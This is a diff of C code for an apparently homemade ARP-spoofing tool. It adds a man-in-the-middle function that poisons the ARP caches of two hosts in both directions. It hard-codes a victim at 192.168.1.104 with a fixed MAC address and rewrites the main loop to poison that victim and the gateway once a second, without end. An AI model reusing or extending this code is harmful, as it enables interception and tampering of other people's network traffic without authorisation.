@@ -96,6 +96,7 @@ cheater_arp_throw_shit(unsigned int target, unsigned int iwannabe)
     if(iidx > net_info->d_arr_max || tidx > net_info->d_arr_max)
     {
         _MESSAGE_OUT("[!] wtf??? \n");
+        return false;
     }
 
     if(false == net_info->d_arr[iidx].is_online)
@@ -117,6 +118,12 @@ cheater_arp_throw_shit(unsigned int target, unsigned int iwannabe)
 }
 
 
+int
+cheater_arp_mitm(unsigned int t1, unsigned int t2)
+{
+    return cheater_arp_throw_shit(t1, t2) && cheater_arp_throw_shit(t2, t1);
+}
+
 
 void
 cheater_test(void)
@@ -137,15 +144,27 @@ cheater_test(void)
 
     }
 #endif
+    _MESSAGE_OUT("=======%s\n", __func__);
 
-    int i=0;
-    for(i=0; i<net_info->d_arr_max; i++)
-    {
-        cheater_arp_request_broadcast_sender(
-            net_info->mac,
-            net_info->ip_netint32 & net_info->ip_mask | _ntoh32(i),
-            net_info->ip_netint32);
-    }
+    // int i=0;
+    // int n = 0;
+    // while(1)
+    // {
+    //     for(i=0; i<net_info->d_arr_max; i++)
+    //     {
+    //         if(cheater_arp_request_broadcast_sender(
+    //             net_info->mac,
+    //             net_info->ip_netint32 & net_info->ip_mask | _ntoh32(i),
+    //             net_info->ip_netint32))
+    //         {
+
+    //             // printf("send %d\n", n++);
+
+
+    //         }        
+    //     }
+    // }
+ 
 
     net_info->d_arr[104].is_online      = true;
     memcpy(net_info->d_arr[104].mac, "\x24\x24\xe\x41\x58\xc7", 6);
@@ -158,7 +177,7 @@ cheater_test(void)
 
     while(1)
     {
-        cheater_arp_throw_shit(_iptonetint32("192.168.1.104"), net_info->ip_route_netint32);
+        cheater_arp_mitm(_iptonetint32("192.168.1.104"), net_info->ip_route_netint32);
         sleep(1);
     }
 }
